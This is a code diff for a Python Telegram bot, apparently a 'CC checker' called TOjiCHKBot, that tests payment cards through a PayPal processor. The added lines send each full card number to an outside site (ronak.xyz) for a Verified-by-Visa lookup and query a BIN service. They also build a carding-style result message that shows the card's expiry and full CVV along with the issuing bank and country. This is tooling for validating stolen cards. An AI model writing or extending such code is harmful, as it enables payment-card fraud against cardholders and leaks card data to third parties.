@@ -1,10 +1,12 @@
 import logging
 import asyncio
 import json
+import html
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from telegram.constants import ParseMode
 import os
+import httpx
 from main import PayPalProcessor
 
 # Enable logging
@@ -28,6 +30,34 @@ def is_admin(user_id: int, username: str = None) -> bool:
 
 # Initialize PayPal processor
 processor = PayPalProcessor()
+
+async def get_vbv_info(card_number: str) -> str:
+    """Fetch VBV (Verified by Visa) information for a card"""
+    try:
+        async with httpx.AsyncClient(timeout=10.0) as client:
+            response = await client.get(f"https://ronak.xyz/vbv.php?cc={card_number}")
+            if response.status_code == 200:
+                return response.text.strip()
+    except Exception as e:
+        logger.error(f"Error fetching VBV info: {e}")
+    return "Unknown"
+
+def get_bin_info(bin_number: str) -> dict:
+    """Fetch BIN information from API"""
+    import requests
+    try:
+        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
+        if response.status_code == 200:
+            return response.json()
+    except:
+        pass
+    return {
+        "brand": "UNKNOWN",
+        "type": "UNKNOWN",
+        "country_name": "UNKNOWN",
+        "country_flag": "🏳",
+        "bank": "UNKNOWN"
+    }
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -85,12 +115,40 @@ async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
             await update.message.reply_text("❌ Invalid CVV (3-4 digits)", parse_mode=ParseMode.HTML)
             return
         
+        import time
+        start_time = time.time()
+        
         await update.message.reply_text("⏳ Checking card...", parse_mode=ParseMode.HTML)
         
         # Run in executor to avoid blocking
         result = await asyncio.to_thread(processor.process_payment, cc, mm, yyyy, cvv)
         
-        response = f"{result['emoji']} <b>{result['status']}</b>\n{result['msg']}"
+        vbv_info = await get_vbv_info(cc)
+        bin_info = get_bin_info(cc[:6])
+        
+        time_taken = time.time() - start_time
+        
+        requester_username = update.effective_user.username or update.effective_user.first_name or "Unknown"
+        
+        status_emoji = result['emoji']
+        masked_card = f"{cc[:6]}******{cc[-4:]}|{mm}|{yyyy}|{cvv}"
+        
+        response = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
+𝐩𝐚𝐲𝐩𝐚𝐥 𝐚𝐮𝐭𝐡
+━━━━━━━━━
+𝐂𝐂 ➜ <code>{html.escape(masked_card)}</code>
+𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_emoji}
+𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {html.escape(result['msg'])}
+𝑽𝑩𝑽 ➜ {html.escape(vbv_info)}
+━━━━━━━━━
+𝐁𝐈𝐍 ➜ {cc[:6]}
+𝐓𝐘𝐏𝐄 ➜ {bin_info.get('brand', 'N/A')} {bin_info.get('type', 'N/A')}
+𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}
+𝐁𝐀𝐍𝐊 ➜ {bin_info.get('bank', 'N/A')}
+━━━━━━━━━
+𝗧/𝘁 : {time_taken:.2f}s
+𝐑𝐄𝐐 : @{requester_username}
+𝐃𝐄𝐕 : @mumiru"""
         await update.message.reply_text(response, parse_mode=ParseMode.HTML)
         
     except Exception as e:
